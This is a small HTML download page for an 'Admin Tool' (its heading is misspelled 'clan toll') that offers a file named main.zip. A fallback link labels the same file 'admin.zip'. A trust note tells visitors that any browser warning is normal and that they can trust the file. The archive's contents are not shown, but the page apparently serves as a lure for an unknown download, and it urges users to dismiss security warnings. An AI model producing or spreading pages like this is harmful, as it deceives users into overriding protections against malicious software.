<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Download Admin Tool</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f0f4f8, #d9e4f5);
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background-color: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.1);
      text-align: center;
      width: 360px;
    }

    .container h1 {
      color: #333;
      font-size: 24px;
      margin-bottom: 10px;
    }

    .container p {
      color: #555;
      margin-bottom: 20px;
      font-size: 15px;
    }

    .download-btn {
      background-color: #007BFF;
      color: white;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      text-decoration: none;
      display: inline-block;
      transition: background-color 0.3s ease;
      margin-bottom: 10px;
    }

    .download-btn:hover {
      background-color: #0056b3;
    }

    .trust-note {
      margin-top: 15px;
      font-size: 13px;
      color: #777;
    }

    .alt-link {
      font-size: 13px;
      margin-top: 10px;
      color: #555;
    }

    .alt-link a {
      color: #007BFF;
      text-decoration: none;
    }

    .alt-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Download clan toll </h1>
    <p>Click the button below to download the latest version of <strong>main.zip</strong>.</p>

    <!-- ✅ MAIN DOWNLOAD BUTTON -->
    <a href="/main.zip" download class="download-btn">Download Now</a>

    <!-- 🔁 ALTERNATIVE TEXT LINK -->
    <div class="alt-link">
      If your browser blocks it, <a href="main.zip" download>click here to download admin.zip</a>
    </div>

    <div class="trust-note">
       ✅If you see a warning, it's normal for new apps. You can trust this file.
    </div>
  </div>
</body>
</html>
